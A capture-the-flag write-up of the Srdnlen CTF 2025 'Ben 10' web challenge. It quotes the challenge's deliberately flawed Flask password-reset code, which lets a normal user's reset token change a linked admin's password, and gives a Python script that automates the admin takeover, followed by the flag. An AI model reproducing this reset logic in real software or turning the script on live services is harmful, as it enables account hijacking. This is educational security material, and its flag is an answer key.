---
title: "Ben 10 - Srdnlen CTF 2025 Quals"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "render-template", "sqlite", "ben", "ssti", "srdnlen-ctf-2025-quals", "2025", "ctf-writeup"]
summary: "Website: <http://ben10.challs.srdnlen.it:8080>"
source:
  name: "CTFtime writeup #39825"
  url: "https://ctftime.org/writeup/39825"
ctf:
  name: "Srdnlen CTF 2025 Quals"
  year: 2025
  challenge: "Ben 10"
---

## Metadata

- **CTF:** Srdnlen CTF 2025 Quals
- **Task:** Ben 10
- **Author team:** aetruria
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39825>

---
### Challenge Description

> Ben Tennyson's Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It's hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden. Can you outsmart the system and reveal the flag?  
Website: <http://ben10.challs.srdnlen.it:8080>

### Initial Analysis

Trying to visit the page, you are redirected to a login screen:

![login](<https://i.imgur.com/QQdDFSE.png>)

After creating the account and logging in, you are redirected to the following page:

![home](<https://i.imgur.com/XxXfqLb.png>)

Clicking on an image redirects you to a preview page of the image. However, this happened for almost all images, except when clicking on the `Materia Grigia` image, which instead led to the following page:

![materiaGrigia](<https://i.imgur.com/4CEPELK.png>)

From here, it can be inferred that you need to somehow log in as an admin to be able to read the flag. By reading the attached files in `[app.py](http://app.py)`, as we can see from the `register` function, every time an account was created, an admin account with privileges to access the page containing the flag was also created. The username of the admin account was generated in the following format: `admin^username^randomToken`:

```python  
@app.route('/register', methods=['GET', 'POST'])  
def register():  
"""Handle user registration."""  
if request.method == 'POST':  
username = request.form['username']  
password = request.form['password']

if username.startswith('admin') or '^' in username:  
flash("I don't like admins", "error")  
return render_template('register.html')

if not username or not password:  
flash("Both fields are required.", "error")  
return render_template('register.html')

admin_username = f"admin^{username}^{secrets.token_hex(5)}"  
admin_password = secrets.token_hex(8)

try:  
conn = sqlite3.connect(DATABASE)  
cursor = conn.cursor()  
cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",  
(username, password, admin_username))  
cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",  
(admin_username, admin_password, None))  
conn.commit()  
except sqlite3.IntegrityError:  
flash("Username already exists!", "error")  
return render_template('register.html')  
finally:  
conn.close()

flash("Registration successful!", "success")  
return redirect(url_for('login'))

return render_template('register.html')  
```

The admin username could be extracted from the homepage, as it was contained in an HTML tag with CSS set to `display:none`. Therefore, by viewing the page source, it could be accessed:

```  
  
<div style="display:none;" id="admin_data">{{ admin_username }}</div>  
```

![admin_user](<https://i.imgur.com/e9GMAS6.png>)

### Exploitation

As seen in the first screenshot, there is also a "forgot password" function, and consequently, a password reset feature. So, I thought of exploiting this function to change the password of the created admin account, allowing me to log in with it and read the flag. The `reset_password` function generated a password reset token, which was then associated with the username in the database. However, the username entered could not start with `admin`, so it was not possible to directly generate a reset token for the admin account:

```python  
@app.route('/reset_password', methods=['GET', 'POST'])  
def reset_password():  
"""Handle reset password request."""  
if request.method == 'POST':  
username = request.form['username']

if username.startswith('admin'):  
flash("Admin users cannot request a reset token.", "error")  
return render_template('reset_password.html')

if not get_user_by_username(username):  
flash("Username not found.", "error")  
return render_template('reset_password.html')

reset_token = secrets.token_urlsafe(16)  
update_reset_token(username, reset_token)

flash("Reset token generated!", "success")  
return render_template('reset_password.html', reset_token=reset_token)

return render_template('reset_password.html')  
```

So, I generated the reset token with the non-privileged account:

![reset](<https://i.imgur.com/AwIdbU7.png>)

Then, I used the previously generated token to reset the password of the admin account:

![admin_reset](<https://i.imgur.com/VmjhTTJ.png>)

By calling the `forgot_password` function, I was able to change the password of the admin account:

```python  
@app.route('/forgot_password', methods=['GET', 'POST'])  
def forgot_password():  
"""Handle password reset."""  
if request.method == 'POST':  
username = request.form['username']  
reset_token = request.form['reset_token']  
new_password = request.form['new_password']  
confirm_password = request.form['confirm_password']

if new_password != confirm_password:  
flash("Passwords do not match.", "error")  
return render_template('forgot_password.html', reset_token=reset_token)

user = get_user_by_username(username)  
if not user:  
flash("User not found.", "error")  
return render_template('forgot_password.html', reset_token=reset_token)

if not username.startswith('admin'):  
token = get_reset_token_for_user(username)  
if token and token[0] == reset_token:  
update_password(username, new_password)  
flash(f"Password reset successfully.", "success")  
return redirect(url_for('login'))  
else:  
flash("Invalid reset token for user.", "error")  
else:  
username = username.split('^')[1]  
token = get_reset_token_for_user(username)  
if token and token[0] == reset_token:  
update_password(request.form['username'], new_password)  
flash(f"Password reset successfully.", "success")  
return redirect(url_for('login'))  
else:  
flash("Invalid reset token for user.", "error")

return render_template('forgot_password.html', reset_token=request.args.get('token'))  
```

Once the password of the admin account was reset, I logged in and accessed the `/ben/10` route, where the flag was located:

![flag](<https://i.imgur.com/bhWCnYi.png>)

### Automated Exploit

I also wrote a Python script that automated the entire process described above, so that I wouldn't have to do anything manually:

```python  
import requests  
from faker import Faker  
from bs4 import BeautifulSoup

fake = Faker()  
user_data = {  
'username': fake.user_name(),  
'password': fake.password(),  
}

s = requests.Session()

url = "<http://ben10.challs.srdnlen.it:8080/>"  
[s.post](http://s.post)(url+"register", data=user_data)

## Admin username extraction  
admin_user = BeautifulSoup([s.post](http://s.post)(url+"login",data=user_data).text, 'html.parser').find('div', id='admin_data').get_text()

## Reset token extraction and password reset for the admin user  
reset_token = BeautifulSoup([s.post](http://s.post)(url+"reset_password", data={"username":user_data["username"]}).text, 'html.parser').find('strong').get_text()

admin_reset_data= {  
"username": admin_user,  
"reset_token": reset_token,  
"new_password": user_data["password"],  
"confirm_password": user_data["password"],  
}  
[s.post](http://s.post)(url+"forgot_password", data=admin_reset_data).text

## Login with the admin user  
[s.post](http://s.post)(url + "login", data={"username":admin_reset_data["username"], "password":admin_reset_data["new_password"]})

## Flag extraction  
print("\nFLAG: " + BeautifulSoup(s.get(url + "image/ben10").text, 'html.parser').find('p', class_='error').get_text().split("Flag: ")[1])  
```

### Flag

```  
srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}  
```
